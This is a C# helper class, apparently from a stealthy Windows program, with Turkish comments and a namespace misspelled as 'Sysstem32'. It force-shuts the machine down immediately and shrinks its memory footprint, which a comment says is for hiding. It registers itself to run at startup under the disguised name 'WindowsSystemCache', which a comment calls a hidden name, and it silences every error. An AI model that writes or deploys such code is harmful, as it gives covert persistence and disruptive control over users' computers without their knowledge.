using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Sysstem32.Helpers

{
    public static class SystemManager
    {
        // Windows API - Shutdown için
        [DllImport("user32.dll")]
        private static extern bool ExitWindowsEx(uint uFlags, uint dwReason);

        [DllImport("kernel32.dll")]
        private static extern bool SetProcessWorkingSetSize(IntPtr process, int minimumWorkingSetSize, int maximumWorkingSetSize);

        // Shutdown flags
        private const uint EWX_SHUTDOWN = 0x00000001;
        private const uint EWX_FORCE = 0x00000004;
        private const uint EWX_FORCEIFHUNG = 0x00000010;

        public static void ForceShutdown()
        {
            try
            {
                // Zorla kapatma komutu
                Process.Start(new ProcessStartInfo
                {
                    FileName = "shutdown",
                    Arguments = "/s /f /t 0", // /s=shutdown, /f=force, /t=time(0=immediately)
                    CreateNoWindow = true,
                    UseShellExecute = false
                });
            }
            catch
            {
                // Backup method - API kullan
                try
                {
                    ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE | EWX_FORCEIFHUNG, 0);
                }
                catch { }
            }
        }

        public static void MinimizeMemoryFootprint()
        {
            try
            {
                // Process memory'yi minimize et (gizleme için)
                SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1);
            }
            catch { }
        }

        public static void AddToStartup()
        {
            try
            {
                string appPath = Application.ExecutablePath;
                string appName = "WindowsSystemCache"; // Gizli isim

                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
                {
                    key?.SetValue(appName, appPath);
                }
            }
            catch { }
        }

        public static void RemoveFromStartup()
        {
            try
            {
                string appName = "WindowsSystemCache";

                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
                {
                    key?.DeleteValue(appName, false);
                }
            }
            catch { }
        }

        public static bool IsInStartup()
        {
            try
            {
                string appName = "WindowsSystemCache";

                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", false))
                {
                    return key?.GetValue(appName) != null;
                }
            }
            catch { return false; }
        }
    }
}
